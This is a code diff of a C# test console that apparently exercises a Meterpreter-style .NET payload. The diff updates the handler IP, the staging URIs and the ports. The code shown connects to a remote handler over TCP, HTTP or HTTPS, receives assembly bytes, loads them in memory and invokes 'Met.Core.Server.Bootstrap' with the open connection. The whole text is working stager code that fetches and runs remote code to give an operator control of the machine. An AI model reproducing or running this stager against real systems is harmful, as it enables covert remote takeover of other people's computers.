@@ -13,7 +13,7 @@ namespace TestConsole
 {
     class Program
     {
-        static string host = @"192.168.146.156";
+        static string host = @"192.168.146.129";
 
         static void Main(string[] args)
         {
@@ -26,10 +26,10 @@ namespace TestConsole
         {
 #if NET40
             var port = 4451;
-            var uri = @"/WJUTxSMP805Bf0BhHAA0Og8n8WXPvqO7QO635HTAludi6E5_RaHi30yFOkcr23WTgJhkE7wzMi_2XJN3A3YBhAjie6uTbvHd-Ryv0I8bNIpb2J1kYlzYSs_";
+            var uri = @"/3X5_a0rr16Fr7mrwNlc-BAvWW4ynC61DrCfRF-x6AEtSYW71UriHu4JMXSA8WcDtc6yxgj1_0FCmklCbUh8VdjxDkMioEZejUaWV-_inN8_LhgoAv9REC5cX7oKxKDYdjqI-CxYO21TSTaBHcv3C1JiHTYQCnFgnFCeedNW1a3mDjHc2bkXtnXak5hTQSXKlkKtOxUbllzF8qba";
 #else
             var port = 4449;
-            var uri = @"/DgpgB6pR-3HmeudnuwLKUghZuMxaWdHo0XuT-ZzO0Xcyv54gGsB7aig4hD2wRV-Q9ulIdw2KZdN497W9kvyMBsey9";
+            var uri = @"/SgvuCZtj5M0XSxZWSvJClAKw51SJ0s2RIo_qG0FTCMPXcMhOvhWbASvKH_-B9OfPF6FjA_mIE4GkS8INW0aRWHXaktoRVVlYdYDVuW8ekE7OVCdz-7LjzahI47CbW0e1Vt6LqIoPiiL77gjv";
 #endif
             var scheme = "https";
             var url = string.Format(@"{0}://{1}:{2}{3}/", scheme, host, port, uri);
@@ -57,10 +57,10 @@ namespace TestConsole
         {
 #if NET40
             var port = 4450;
-            var uri = @"/WJUTxSMP805Bf0BhHAA0Og8n8WXPvqO7QO635HTAludi6E5_RaHi30yFOkcr23WTgJhkE7wzMi_2XJN3A3YBhAjie6uTbvHd-Ryv0I8bNIpb2J1kYlzYSs_";
+            var uri = @"/3X5_a0rr16Fr7mrwNlc-BAvWW4ynC61DrCfRF-x6AEtSYW71UriHu4JMXSA8WcDtc6yxgj1_0FCmklCbUh8VdjxDkMioEZejUaWV-_inN8_LhgoAv9REC5cX7oKxKDYdjqI-CxYO21TSTaBHcv3C1JiHTYQCnFgnFCeedNW1a3mDjHc2bkXtnXak5hTQSXKlkKtOxUbllzF8qba";
 #else
             var port = 4448;
-            var uri = @"/DgpgB6pR-3HmeudnuwLKUghZuMxaWdHo0XuT-ZzO0Xcyv54gGsB7aig4hD2wRV-Q9ulIdw2KZdN497W9kvyMBsey9";
+            var uri = @"/SgvuCZtj5M0XSxZWSvJClAKw51SJ0s2RIo_qG0FTCMPXcMhOvhWbASvKH_-B9OfPF6FjA_mIE4GkS8INW0aRWHXaktoRVVlYdYDVuW8ekE7OVCdz-7LjzahI47CbW0e1Vt6LqIoPiiL77gjv";
 #endif
             var scheme = "http";
             var url = string.Format(@"{0}://{1}:{2}{3}/", scheme, host, port, uri);
@@ -78,7 +78,7 @@ namespace TestConsole
 #else
             var port = 4444;
 #endif
-            tcpClient.Connect("192.168.146.156", port);
+            tcpClient.Connect(host, port);
             if (tcpClient.Connected)
             {
                 using (var s = tcpClient.GetStream())
@@ -105,8 +105,16 @@ namespace TestConsole
 
                 var assembly = Assembly.Load(bytes);
                 var type = assembly.GetType("Met.Core.Server");
-                type.InvokeMember("Bootstrap", BindingFlags.Public | BindingFlags.Static | BindingFlags.InvokeMethod,
-                    null, null, new object[] { memReader, client });
+                try
+                {
+                    type.InvokeMember("Bootstrap", BindingFlags.Public | BindingFlags.Static | BindingFlags.InvokeMethod,
+                        null, null, new object[] { memReader, client });
+                }
+                catch (Exception e)
+                {
+                    Console.WriteLine(e.StackTrace);
+                    System.Diagnostics.Debugger.Break();
+                }
             }
         }
 
